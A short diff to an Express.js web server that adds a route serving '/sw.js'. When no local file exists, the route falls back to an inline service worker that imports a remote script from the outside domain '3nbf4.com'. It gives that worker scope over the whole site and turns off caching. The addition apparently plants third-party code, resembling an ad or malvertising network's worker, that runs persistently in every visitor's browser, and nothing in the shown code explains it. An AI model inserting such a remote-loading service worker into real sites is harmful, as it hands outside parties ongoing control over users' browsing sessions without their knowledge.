@@ -137,6 +137,24 @@ app.get('/subpage', (req, res) => {
   res.sendFile(path.join(__dirname, 'pages', 'subpage.html'));
 });
 
+// Service Worker Route
+app.get('/sw.js', (req, res) => {
+  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+  res.setHeader('Service-Worker-Allowed', '/');
+  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+  const swPath = path.join(__dirname, 'sw.js');
+  if (fs.existsSync(swPath)) {
+    return res.sendFile(swPath);
+  }
+  res.send(`self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11726247
+};
+self.lary = "";
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw');
+`);
+});
+
 // --- API ENDPOINTS ---
 
 // Register User
